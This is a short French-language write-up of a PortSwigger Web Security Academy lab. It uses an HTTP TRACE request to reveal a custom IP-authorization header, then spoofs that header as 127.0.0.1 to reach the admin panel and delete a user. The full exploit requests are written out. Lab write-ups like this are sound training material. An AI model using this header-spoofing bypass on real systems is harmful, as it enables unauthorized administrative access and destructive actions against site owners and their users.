# Lab

https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass

## Payload

`https://0abc00c40370ae8b8245926d00f50073.web-security-academy.net/admin` -> `Admin interface only available to local users`

Avec une requete de type `TRACE` sur `/admin` on obtient:

```
HTTP/2 200 OK
Content-Type: message/http
X-Frame-Options: SAMEORIGIN
Content-Length: 724

TRACE /admin HTTP/1.1
Host: 0abc00c40370ae8b8245926d00f50073.web-security-academy.net
sec-ch-ua: 
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""
upgrade-insecure-requests: 1
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
sec-fetch-site: none
sec-fetch-mode: navigate
sec-fetch-user: ?1
sec-fetch-dest: document
accept-encoding: gzip, deflate
accept-language: en-US,en;q=0.9
cookie: session=uanEExZAF6G2lwZID4SiKD6zRCcu3QqB
Content-Length: 0
X-Custom-IP-Authorization: 31.37.183.241
```

On voit le header `x-custom-ip-authorization` qui contient une IP.

Le message d'erreur disait que l'interface admin n'était accessible que localement, donc on peut essayer de changer l'IP dans le header pour `127.0.0.1` et on obtient une réponse.

Plus qu'à supprimer l'utilisateur `carlos` pour valider le lab en réutilisation le header `x-custom-ip-authorization` avec la valeur `127.0.0.1` et la requete sur `/admin/delete?username=carlos`.

```
GET /admin/delete?username=carlos HTTP/2
Host: 0abc00c40370ae8b8245926d00f50073.web-security-academy.net
Cookie: session=uanEExZAF6G2lwZID4SiKD6zRCcu3QqB
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0abc00c40370ae8b8245926d00f50073.web-security-academy.net/admin
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
X-Custom-Ip-Authorization: 127.0.0.1
```